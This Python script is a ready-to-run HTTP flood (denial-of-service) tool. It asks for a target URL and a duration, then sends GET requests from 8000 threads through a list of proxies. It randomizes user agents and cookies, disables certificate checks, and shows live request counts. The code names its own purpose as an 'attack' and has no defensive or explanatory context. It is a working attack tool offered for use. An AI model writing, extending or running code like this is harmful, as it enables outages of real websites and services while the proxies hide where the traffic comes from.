import requests
import threading
import time
import random
from concurrent.futures import ThreadPoolExecutor
from requests.adapters import HTTPAdapter
from urllib3.poolmanager import PoolManager
from fake_useragent import UserAgent
import warnings
import os
import urllib3

# Disable warnings
urllib3.disable_warnings()
warnings.filterwarnings("ignore", category=UserWarning, module='requests')

class SSLAdapter(HTTPAdapter):
    def init_poolmanager(self, *args, **kwargs):
        kwargs['ssl_context'] = None
        return super().init_poolmanager(*args, **kwargs)

# Function to generate dynamic cookies
def generate_dynamic_cookies():
    return {
        'session': str(random.randint(100000, 999999)),
        'user': f'user_{random.randint(1000, 9999)}',
        'theme': random.choice(['light', 'dark']),
        'lang': random.choice(['en', 'es', 'fr', 'zh']),
    }

# Function to attack the target URL with proxy support
def attack_with_proxy(session, target_url, proxies_list, headers, duration, stats):
    end_time = time.time() + duration
    while time.time() < end_time:
        for proxy in proxies_list:
            proxy_url = f"http://{proxy}"
            cookies = generate_dynamic_cookies()
            try:
                response = session.get(target_url,
                                       headers=headers,
                                       cookies=cookies,
                                       proxies={"http": proxy_url, "https": proxy_url},
                                       timeout=5,
                                       verify=False)
                if response.status_code == 200:
                    stats['200_successful'] += 1
                stats['total_requests'] += 1
            except requests.exceptions.RequestException:
                stats['error'] += 1

# Function to load headers
def load_headers():
    ua = UserAgent()
    return {
        "User-Agent": ua.random,
        "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
        "Accept-Encoding": "gzip, deflate, br",
        "Accept-Language": random.choice(["en-US,en;q=0.9", "es-ES,es;q=0.9", "ru-RU,ru;q=0.9", "zh-CN,zh;q=0.9", "fr-FR,fr;q=0.9"]),
    }

# Function to update stats every second
def update_stats(stats):
    while True:
        time.sleep(1)
        os.system('cls' if os.name == 'nt' else 'clear')
        print(f"[Total Requests: ] {stats['total_requests']}  "
              f"[200 Successful: ] {stats['200_successful']}  "
              f"[Error: ] {stats['error']}", end="", flush=True)

# Main function to execute the attack
def main():
    target_url = input("Enter the target URL: ")
    duration = int(input("Enter the duration in seconds: "))
    proxies_file = "proxy.txt"

    with open(proxies_file, "r") as f:
        proxies_list = [line.strip() for line in f.readlines()]

    headers = load_headers()

    threads = 8000  # Increase threads to maximize connections (example: 5000 threads)
    
    stats = {
        'total_requests': 0,
        '200_successful': 0,
        'error': 0
    }

    # Initialize session with adapter
    session = requests.Session()
    adapter = SSLAdapter()
    session.mount('http://', adapter)
    session.mount('https://', adapter)

    print(f"Starting attack with the following configuration:\n"
          f"Target: {target_url}\nDuration: {duration} seconds\n"
          f"Threads: {threads}\nProxies loaded: {len(proxies_list)}")

    stats_thread = threading.Thread(target=update_stats, args=(stats,))
    stats_thread.daemon = True
    stats_thread.start()

    # Use ThreadPoolExecutor for thread management
    with ThreadPoolExecutor(max_workers=threads) as executor:
        futures = [executor.submit(attack_with_proxy, session, target_url, proxies_list, headers, duration, stats) for _ in range(threads)]
        
        # Wait for all threads to finish
        for future in futures:
            future.result()

    print("\n\nAttack completed!\n"
          f"[Total Requests: ] {stats['total_requests']}\n"
          f"[200 Successful: ] {stats['200_successful']}\n"
          f"[Error: ] {stats['error']}")

if __name__ == "__main__":
    main()
